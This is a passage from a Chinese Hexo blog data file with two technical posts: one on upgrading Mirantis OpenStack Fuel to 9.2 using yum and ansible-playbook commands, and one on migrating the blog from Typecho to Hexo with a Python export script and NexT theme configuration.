class="number">4</span>a<span class="number">13</span>-<span class="number">943</span>b-ed<span class="number">6000</span>d<span class="number">2</span>aa<span class="number">02</span>.tar.gz to /tmp/tmpnixoNM</span><br><span class="line"><span class="attribute">Bootstrap</span> image <span class="number">59129</span>ecd-cccd-<span class="number">4</span>a<span class="number">13</span>-<span class="number">943</span>b-ed<span class="number">6000</span>d<span class="number">2</span>aa<span class="number">02</span> has been imported.</span><br></pre></td></tr></table></figure><p>激活 bootstrap</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fuel-bootstrap activate 59129ecd-cccd-4a13-943b-ed6000d2aa02</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Bootstrap</span> image <span class="number">59129</span>ecd-cccd-<span class="number">4</span>a<span class="number">13</span>-<span class="number">943</span>b-ed<span class="number">6000</span>d<span class="number">2</span>aa<span class="number">02</span> has been activated.</span><br></pre></td></tr></table></figure><p>查看新增bootstrap</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"># fuel-bootstrap list</span><br><span class="line"></span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------<span class="code">+--------+</span></span><br><span class="line">| uuid                                 | label                                | status |</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------<span class="code">+--------+</span></span><br><span class="line">| 59129ecd-cccd-4a13-943b-ed6000d2aa02 | 59129ecd-cccd-4a13-943b-ed6000d2aa02 | active |</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------<span class="code">+--------+</span></span><br></pre></td></tr></table></figure><h2 id="升级-Mirantis-OpenStack-9-x-到-9-2"><a href="#升级-Mirantis-OpenStack-9-x-到-9-2" class="headerlink" title="升级 Mirantis OpenStack 9.x 到 9.2"></a>升级 Mirantis OpenStack 9.x 到 9.2</h2><h3 id="1-添加mos92-updates更新源"><a href="#1-添加mos92-updates更新源" class="headerlink" title="1. 添加mos92-updates更新源"></a>1. 添加mos92-updates更新源</h3><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"># yum install -y http://mirror.fuel-infra.org/mos-repos/centos/mos<span class="number">9.0</span>-centos<span class="number">7</span>/<span class="number">9.2</span>-updates/<span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span>/Packages/mos-<span class="keyword">release</span><span class="number">-9.2</span><span class="number">-1</span>.el<span class="number">7</span>.<span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span>.rpm</span><br></pre></td></tr></table></figure><h3 id="2-清除-yum-缓存"><a href="#2-清除-yum-缓存" class="headerlink" title="2. 清除 yum 缓存"></a>2. 清除 yum 缓存</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum clean all</span></span><br></pre></td></tr></table></figure><h3 id="3-安装-mos-playbooks"><a href="#3-安装-mos-playbooks" class="headerlink" title="3. 安装 mos-playbooks"></a>3. 安装 mos-playbooks</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install -y mos-updates</span></span><br></pre></td></tr></table></figure><h3 id="4-切换到mos-playbooks-mos-mu-目录"><a href="#4-切换到mos-playbooks-mos-mu-目录" class="headerlink" title="4. 切换到mos_playbooks/mos_mu/ 目录"></a>4. 切换到mos_playbooks/mos_mu/ 目录</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># cd mos_playbooks<span class="regexp">/mos_mu/</span></span><br></pre></td></tr></table></figure><h3 id="5-执行环境准备的playbook"><a href="#5-执行环境准备的playbook" class="headerlink" title="5. 执行环境准备的playbook"></a>5. 执行环境准备的playbook</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># ansible-playbook playbooks/mos9_prepare_fuel.yml</span></span><br></pre></td></tr></table></figure><h3 id="6-升级Fuel-节点上的包、服务、配置，期间各服务都会重启"><a href="#6-升级Fuel-节点上的包、服务、配置，期间各服务都会重启" class="headerlink" title="6. 升级Fuel 节点上的包、服务、配置，期间各服务都会重启"></a>6. 升级Fuel 节点上的包、服务、配置，期间各服务都会重启</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"># ansible-playbook playbooks/update_fuel.yml -e &#x27;&#123;<span class="string">&quot;rebuild_bootstrap&quot;</span>:<span class="literal">false</span>&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="7-升级Fuel-bootstrap-内核"><a href="#7-升级Fuel-bootstrap-内核" class="headerlink" title="7. 升级Fuel bootstrap 内核"></a>7. 升级Fuel bootstrap 内核</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="attr"># ansible-playbook playbooks/mos9</span>_fuel_upgrade_ker<span class="symbol">nel_4</span><span class="number">.4</span>.yml</span><br></pre></td></tr></table></figure><h3 id="8-确认升级成功"><a href="#8-确认升级成功" class="headerlink" title="8. 确认升级成功"></a>8. 确认升级成功</h3><figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"># fuel2 fuel-version</span><br><span class="line"> </span><br><span class="line"><span class="symbol">api:</span> <span class="comment">&#x27;1&#x27;</span></span><br><span class="line"><span class="symbol">auth_required:</span> <span class="literal">true</span></span><br><span class="line"><span class="symbol">feature_groups:</span> []</span><br><span class="line"><span class="symbol">openstack_version:</span> mitaka-<span class="number">9.0</span></span><br><span class="line"><span class="symbol">release:</span> <span class="comment">&#x27;9.2&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://docs.mirantis.com/openstack/fuel/fuel-9.2/release-notes/update-product.html#update-from-9-to-9-2">Update to minor releases (9.x)</a></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> fuel </tag>
            
            <tag> bootstrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客从 typecho 迁移到 Hexo</title>
      <link href="linux/from-typecho-to-hexo.html"/>
      <url>linux/from-typecho-to-hexo.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hexo-环境搭建"><a href="#Hexo-环境搭建" class="headerlink" title="Hexo 环境搭建"></a>Hexo 环境搭建</h2><p>使用 <a href="https://coding.net/pages/">coding</a> 和 <a href="https://pages.github.com/">github.io</a> 的 pages 服务，绑定了自己的域名，做了双线解析，国内用户解析到 coding ,国外用户解析到 github.io，访问速度很满意(本来就是静态文件，访问速度很快)。<br>Hexo 环境的搭建，这里不再赘述，主要介绍如何导出 typecho 的数据和 Hexo 站点的配置以及 Next 主题的配置及优化。</p><h2 id="typecho-数据导出"><a href="#typecho-数据导出" class="headerlink" title="typecho 数据导出"></a>typecho 数据导出</h2><h3 id="文章数据的导出"><a href="#文章数据的导出" class="headerlink" title="文章数据的导出"></a>文章数据的导出</h3><p>花了点时间把 typecho 的文章全部改写成 Markdown 的格式，方便我导出为 md 文件，使用了 github 上面一个开源的 python 项目 <a href="https://github.com/zhourongyu/Typecho2Hexo">Typecho2Hexo</a> 进行 typecho 文章数据的导出。稍微修改后如下所示:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> torndb</span><br><span class="line"><span class="keyword">import</span> arrow</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_data</span>(<span class="params">db</span>):</span></span><br><span class="line">    <span class="comment"># 创建分类和标签</span></span><br><span class="line">    categories = db.query(<span class="string">&quot;select type, slug, name from typecho_metas&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> cate <span class="keyword">in</span> categories:</span><br><span class="line">        path = <span class="string">&#x27;data/%s&#x27;</span> % cate.slug</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            os.makedirs(path)</span><br><span class="line">        f = codecs.<span class="built_in">open</span>(<span class="string">&#x27;%s/index.md&#x27;</span> % path, <span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;title: %s\n&quot;</span> % cate.slug)</span><br><span class="line">        f.write(<span class="string">&quot;date: %s\n&quot;</span> % arrow.now().<span class="built_in">format</span>(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>))</span><br><span class="line">        <span class="comment"># 区分分类和标签</span></span><br><span class="line">        <span class="keyword">if</span> cate.<span class="built_in">type</span> == <span class="string">&#x27;category&#x27;</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;type: &quot;categories&quot;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> cate.<span class="built_in">type</span> == <span class="string">&#x27;tags&#x27;</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;type: &quot;tags&quot;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 禁止评论</span></span><br><span class="line">        f.write(<span class="string">&quot;comments: true\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;---\n&quot;</span>)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建文章</span></span><br><span class="line">    entries = db.query(<span class="string">&quot;select cid, title, slug, text, created from typecho_contents where type=&#x27;post&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> entries:</span><br><span class="line">        title = e.title</span><br><span class="line">        urlname = e.slug</span><br><span class="line">        print(title)</span><br><span class="line">        content = <span class="built_in">str</span>(e.text).replace(<span class="string">&#x27;&lt;!--markdown--&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        tags = []</span><br><span class="line">        category = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 找出文章的tag及category</span></span><br><span class="line">        metas = db.query(</span><br><span class="line">            <span class="string">&quot;select type, name, slug from `typecho_relationships` ts, typecho_metas tm where tm.mid = ts.mid and ts.cid = %s&quot;</span>,</span><br><span class="line">            e.cid)</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> metas:</span><br><span class="line">            <span class="keyword">if</span> m.<span class="built_in">type</span> == <span class="string">&#x27;tag&#x27;</span>:</span><br><span class="line">                tags.append(m.name)</span><br><span class="line">            <span class="keyword">if</span> m.<span class="built_in">type</span> == <span class="string">&#x27;category&#x27;</span>:</span><br><span class="line">                category = m.slug</span><br><span class="line">        path = <span class="string">&#x27;data/_posts/&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            os.makedirs(path)</span><br><span class="line">        f = codecs.<span class="built_in">open</span>(<span class="string">r&quot;%s%s.md&quot;</span> % (path,title), <span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;---\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;title: %s\n&quot;</span> % title)</span><br><span class="line">        f.write(<span class="string">&quot;date: %s\n&quot;</span> % arrow.get(e.created).<span class="built_in">format</span>(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>))</span><br><span class="line">        f.write(<span class="string">&quot;categories: %s\n&quot;</span> % category)</span><br><span class="line">        f.write(<span class="string">&quot;tags: [%s]\n&quot;</span> % <span class="string">&#x27;,&#x27;</span>.join(tags))</span><br><span class="line">        f.write(<span class="string">&quot;urlname: %s\n&quot;</span> % urlname)</span><br><span class="line">        f.write(<span class="string">&quot;---\n&quot;</span>)</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 把数据库连接信息</span></span><br><span class="line">    db = torndb.Connection(host=<span class="string">&quot;******&quot;</span>, database=<span class="string">&quot;******&quot;</span>, user=<span class="string">&quot;******&quot;</span>, password=<span class="string">&quot;******&quot;</span>)</span><br><span class="line">    create_data(db)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="评论数据的导出"><a href="#评论数据的导出" class="headerlink" title="评论数据的导出"></a>评论数据的导出</h3><p>直接导出 typecho_comment 为 csv 模式，手动处理成 LeanCloud(valine评论插件使用leancloud)的数据格式，因为评论较少，故直接手动处理。</p><h2 id="Hexo配置"><a href="#Hexo配置" class="headerlink" title="Hexo配置"></a>Hexo配置</h2><h3 id="1-固定链接配置"><a href="#1-固定链接配置" class="headerlink" title="1. 固定链接配置"></a>1. 固定链接配置</h3><p>编辑站点 _config.yml 文件修改以下内容,是文章的 URL 链接为 域名/分类/文章名的格式.html，urlname由文章中传入</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site <span class="keyword">is</span> <span class="keyword">put</span> in <span class="keyword">a</span> subdirectory, <span class="keyword">set</span> url <span class="keyword">as</span> <span class="string">&#x27;http://yoursite.com/child&#x27;</span> <span class="built_in">and</span> root <span class="keyword">as</span> <span class="string">&#x27;/child/&#x27;</span></span><br><span class="line">ur<span class="variable">l:</span> http<span class="variable">s:</span>//www.sunmite.<span class="keyword">com</span>/</span><br><span class="line">roo<span class="variable">t:</span> /</span><br><span class="line">permalink: :category/:urlname.html</span><br><span class="line">permalink_default<span class="variable">s:</span></span><br><span class="line">  urlname: <span class="built_in">index</span></span><br></pre></td></tr></table></figure><h3 id="2-RSS配置"><a href="#2-RSS配置" class="headerlink" title="2. RSS配置"></a>2. RSS配置</h3><ul><li>安装插件<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-feed <span class="comment">--save</span></span><br></pre></td></tr></table></figure></li><li>在站点 _config.yml 文件中增加以下内容<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">plugins:</span> <span class="string">hexo-generator-feed</span> </span><br><span class="line"></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span> <span class="comment">##feed类型 atom或者rss2</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span> <span class="comment">##feed路径</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">20</span>  <span class="comment">##feed文章最小数量</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-sitemap配置"><a href="#3-sitemap配置" class="headerlink" title="3. sitemap配置"></a>3. sitemap配置</h3><ul><li>安装插件<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-sitemap <span class="comment">--save</span></span><br></pre></td></tr></table></figure></li><li>在站点 _config.yml 文件中增加以下内容<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">sitemap:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">sitemap.xml</span> </span><br></pre></td></tr></table></figure></li></ul><h2 id="Next配置及优化"><a href="#Next配置及优化" class="headerlink" title="Next配置及优化"></a>Next配置及优化</h2><h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><h4 id="1-页脚设置"><a href="#1-页脚设置" class="headerlink" title="1. 页脚设置"></a>1. 页脚设置</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="comment"># Specify the date when the site was setup.</span></span><br><span class="line">  <span class="comment"># If not defined, current year will be used.</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2014</span> <span class="comment">#建站时间</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Icon between year and copyright info.</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">heart</span> <span class="comment">#修改默认图标为♥</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If not defined, will be used `author` from Hexo main config.</span></span><br><span class="line">  <span class="attr">copyright:</span></span><br><span class="line">  <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">  <span class="comment"># Hexo link (Powered by Hexo).</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">theme:</span></span><br><span class="line">    <span class="comment"># Theme &amp; scheme info link (Theme - NexT.scheme).</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Version info of NexT after scheme info (vX.X.X).</span></span><br><span class="line">    <span class="attr">version:</span> <span class="literal">false</span> <span class="comment"># 不显示主题版本</span></span><br></pre></td></tr></table></figure><h4 id="2-首页菜单设置"><a href="#2-首页菜单设置" class="headerlink" title="2. 首页菜单设置"></a>2. 首页菜单设置</h4><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> / || home</span><br><span class="line">  <span class="meta">#about: /about/ || user</span></span><br><span class="line"><span class="symbol">  tags:</span> <span class="meta-keyword">/tags/</span> || tags                <span class="meta">#标签</span></span><br><span class="line"><span class="symbol">  categories:</span> <span class="meta-keyword">/categories/</span> || th      <span class="meta">#分类</span></span><br><span class="line"><span class="symbol">  archives:</span> <span class="meta-keyword">/archives/</span> || archive     <span class="meta">#归档</span></span><br><span class="line">  <span class="meta">#schedule: /schedule/ || calendar</span></span><br><span class="line">  <span class="meta">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line">  <span class="meta">#commonweal: /404/ || heartbeat</span></span><br></pre></td></tr></table></figure><h4 id="3-主题样式"><a href="#3-主题样式" class="headerlink" title="3. 主题样式"></a>3. 主题样式</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Schemes</span></span><br><span class="line"><span class="meta">#scheme: Muse</span></span><br><span class="line">scheme: Mist    #本站选用</span><br><span class="line"><span class="meta">#scheme: Pisces</span></span><br><span class="line"><span class="meta">#scheme: Gemini</span></span><br></pre></td></tr></table></figure><h4 id="4-个人社交账号"><a href="#4-个人社交账号" class="headerlink" title="4. 个人社交账号"></a>4. 个人社交账号</h4><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">socia<span class="variable">l:</span></span><br><span class="line">  GitHu<span class="variable">b:</span> http<span class="variable">s:</span>//github.<span class="keyword">com</span>/tanmx || github</span><br><span class="line">  E-Mai<span class="variable">l:</span> mailto:tanmingxiao@gmail.<span class="keyword">com</span> || envelope</span><br><span class="line">  #Google: http<span class="variable">s:</span>//plus.google.<span class="keyword">com</span>/yourname || google</span><br><span class="line">  Twitter: http<span class="variable">s:</span>//twitter.<span class="keyword">com</span>/lianyu_ || twitter</span><br><span class="line">  微博: http<span class="variable">s:</span>//weibo.<span class="keyword">com</span>/lovelongerlonger || weibo</span><br><span class="line">  知乎: http<span class="variable">s:</span>//www.zhihu.<span class="keyword">com</span>/people/<span class="built_in">tan</span>-ming-xiao || gratipay  #由于FontAwesome暂未收录知乎的图标，这里使用其他图标代替</span><br></pre></td></tr></table></figure><h4 id="5-友情链接"><a href="#5-友情链接" class="headerlink" title="5. 友情链接"></a>5. 友情链接</h4><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">links_icon:</span> link</span><br><span class="line"><span class="symbol">links_title:</span> 延伸阅读</span><br><span class="line"><span class="meta">#links_layout: block</span></span><br><span class="line"><span class="symbol">links_layout:</span> inline</span><br><span class="line"><span class="symbol">links:</span></span><br><span class="line">  陈沙克日志: http:<span class="comment">//www.chenshake.com/</span></span><br><span class="line">  OpenStack Docs: https:<span class="comment">//docs.openstack.org/</span></span><br><span class="line">  孔令贤的个人博客: https:<span class="comment">//lingxiankong.github.io/index.html</span></span><br></pre></td></tr></table></figure><h4 id="6-目录设置"><a href="#6-目录设置" class="headerlink" title="6. 目录设置"></a>6. 目录设置</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span>  <span class="comment">#关闭目录自动添加序号</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If true, all words will placed on next lines if header width longer then sidebar width.</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="7-Valine留言系统配置"><a href="#7-Valine留言系统配置" class="headerlink" title="7. Valine留言系统配置"></a>7. Valine留言系统配置</h4><p>详细用法可以参考 <a href="https://valine.js.org/">Valine官方文档</a></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Valine.</span></span><br><span class="line"><span class="comment"># You can get your appid and appkey from https://leancloud.cn</span></span><br><span class="line"><span class="comment"># more info please open https://valine.js.org</span></span><br><span class="line"><span class="attr">valine:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">appid:</span>  <span class="comment"># your leancloud application appid</span></span><br><span class="line">  <span class="attr">appkey:</span>  <span class="comment"># your leancloud application appkey</span></span><br><span class="line">  <span class="attr">notify:</span> <span class="literal">true</span> <span class="comment"># mail notifier , https://github.com/xCss/Valine/wiki</span></span><br><span class="line">  <span class="attr">verify:</span> <span class="literal">false</span> <span class="comment"># Verification code</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">(发表评论)</span> <span class="comment"># comment box placeholder</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">mm</span> <span class="comment"># gravatar style</span></span><br><span class="line">  <span class="attr">guest_info:</span> <span class="string">nick,mail,link</span> <span class="comment"># custom comment header</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span> <span class="comment"># pagination size</span></span><br></pre></td></tr></table></figure><h4 id="8-Google、Bing-站长验证"><a href="#8-Google、Bing-站长验证" class="headerlink" title="8. Google、Bing 站长验证"></a>8. Google、Bing 站长验证</h4><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Google Webmaster tools verification setting</span></span><br><span class="line"><span class="meta"># See: https:<span class="comment">//www.google.com/webmasters/</span></span></span><br><span class="line"><span class="symbol">google_site_verification:</span> ******   <span class="meta">#获取自己站长验证代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Google Analytics</span></span><br><span class="line"><span class="meta">#google_analytics:</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Bing Webmaster tools verification setting</span></span><br><span class="line"><span class="meta"># See: https:<span class="comment">//www.bing.com/webmaster/</span></span></span><br><span class="line"><span class="symbol">bing_site_verification:</span> ******  <span class="meta">#获取自己站长验证代码</span></span><br></pre></td></tr></table></figure><h4 id="9-显示每篇文章的访问量"><a href="#9-显示每篇文章的访问量" class="headerlink" title="9. 显示每篇文章的访问量"></a>9. 显示每篇文章的访问量</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Show number of visitors to each article.</span></span><br><span class="line"><span class="comment"># You can visit https://leancloud.cn get AppID and AppKey.</span></span><br><span class="line"><span class="attr">leancloud_visitors:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">app_id:</span> <span class="comment">#&lt;app_id&gt;</span></span><br><span class="line">  <span class="attr">app_key:</span> <span class="comment">#&lt;app_key&gt;</span></span><br></pre></td></tr></table></figure><h4 id="10-百度推送"><a href="#10-百度推送" class="headerlink" title="10. 百度推送"></a>10. 百度推送</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO</span></span><br><span class="line"><span class="attr">baidu_push:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="11-开启本地搜索"><a href="#11-开启本地搜索" class="headerlink" title="11. 开启本地搜索"></a>11. 开启本地搜索</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">Local</span> <span class="keyword">search</span></span><br><span class="line"># Dependencies: https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>theme<span class="operator">-</span>next<span class="operator">/</span>hexo<span class="operator">-</span>generator<span class="operator">-</span>searchdb</span><br><span class="line">local_search:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  # if auto, <span class="keyword">trigger</span> <span class="keyword">search</span> <span class="keyword">by</span> changing input</span><br><span class="line">  # if manual, <span class="keyword">trigger</span> <span class="keyword">search</span> <span class="keyword">by</span> pressing enter key <span class="keyword">or</span> <span class="keyword">search</span> button</span><br><span class="line">  <span class="keyword">trigger</span>: auto</span><br><span class="line">  # <span class="keyword">show</span> top n results <span class="keyword">per</span> article, <span class="keyword">show</span> <span class="keyword">all</span> results <span class="keyword">by</span> setting <span class="keyword">to</span> <span class="number">-1</span></span><br><span class="line">  top_n_per_article: <span class="number">1</span></span><br><span class="line">  # unescape html strings <span class="keyword">to</span> the readable <span class="keyword">one</span></span><br><span class="line">  unescape: <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="12-启用加载进度条"><a href="#12-启用加载进度条" class="headerlink" title="12. 启用加载进度条"></a>12. 启用加载进度条</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Progress bar in the top during page loading.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-pace</span></span><br><span class="line"><span class="attr">pace:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="13-设置作者头像圆角-旋转"><a href="#13-设置作者头像圆角-旋转" class="headerlink" title="13. 设置作者头像圆角,旋转"></a>13. 设置作者头像圆角,旋转</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># in theme directory(source/images): /images/avatar.gif</span></span><br><span class="line">  <span class="comment"># in site  directory(source/uploads): /uploads/avatar.gif</span></span><br><span class="line">  <span class="comment"># You can also use other linking images.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.gif</span> </span><br><span class="line">  <span class="comment"># If true, the avatar would be dispalyed in circle. </span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span>  <span class="comment">#开启圆角头像</span></span><br><span class="line">  <span class="comment"># The value of opacity should be choose from 0 to 1 to set the opacity of the avatar.</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">1</span></span><br><span class="line">  <span class="comment"># If true, the avatar would be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">true</span>  <span class="comment">#旋转</span></span><br></pre></td></tr></table></figure><h4 id="14-修改文章底部上一篇和下一篇的顺序"><a href="#14-修改文章底部上一篇和下一篇的顺序" class="headerlink" title="14. 修改文章底部上一篇和下一篇的顺序"></a>14. 修改文章底部上一篇和下一篇的顺序</h4><p>进入一篇文章，在文章底部，有上下篇的链接（&lt; &gt;），但是点 &gt; 发现进入的是页面中的的上面那篇文章，与操作习惯不符，修改配置使之符合一般习惯。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">Show</span> previous post <span class="keyword">and</span> next post <span class="keyword">in</span> post footer if <span class="keyword">exists</span></span><br><span class="line"># Available <span class="keyword">values</span>: <span class="keyword">left</span> <span class="operator">|</span> <span class="keyword">right</span> <span class="operator">|</span> <span class="literal">false</span></span><br><span class="line">post_navigation: <span class="keyword">right</span></span><br></pre></td></tr></table></figure><h3 id="主题优化"><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h3><h4 id="1-设置博文内链接为蓝色"><a href="#1-设置博文内链接为蓝色" class="headerlink" title="1. 设置博文内链接为蓝色"></a>1. 设置博文内链接为蓝色</h4><p>修改 /themes/next/source/css/_common/components/post/post.styl 这文件末尾添加如下内容</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/* 链接蓝色 */</span></span><br><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span>&#123;</span><br><span class="line">     <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">     <span class="attribute">border-bottom</span>: none;</span><br><span class="line">     &amp;<span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">       <span class="attribute">color</span>: <span class="number">#0477ab</span>;</span><br><span class="line">       <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="2-增加底部版权信息-NexT新版已经支持此feather-主题配置文件开启-custom-text-即可"><a href="#2-增加底部版权信息-NexT新版已经支持此feather-主题配置文件开启-custom-text-即可" class="headerlink" title="2. 增加底部版权信息(NexT新版已经支持此feather,主题配置文件开启 custom_text 即可)"></a>2. <del>增加底部版权信息</del>(NexT新版已经支持此feather,主题配置文件开启 custom_text 即可)</h4><p>增加 Coding 的版权信息，不然访问网站的时候会有 Coding 的跳转页面<br>编辑 /themes/next/layout/_partials/footer.swig 修改一下部分</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123; #</span><br><span class="line">coding版权信息</span><br><span class="line"># &#125;</span><br><span class="line">| Hosted by &lt;a href=&quot;https://pages.coding.me&quot; &gt;Coding Pages&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="3-修改文章底部的那个带-号的标签-NexT新版已经支持此feather-主题配置文件开启-tag-icon-true-即可"><a href="#3-修改文章底部的那个带-号的标签-NexT新版已经支持此feather-主题配置文件开启-tag-icon-true-即可" class="headerlink" title="3. 修改文章底部的那个带#号的标签(NexT新版已经支持此feather,主题配置文件开启 tag_icon: true 即可)"></a>3. 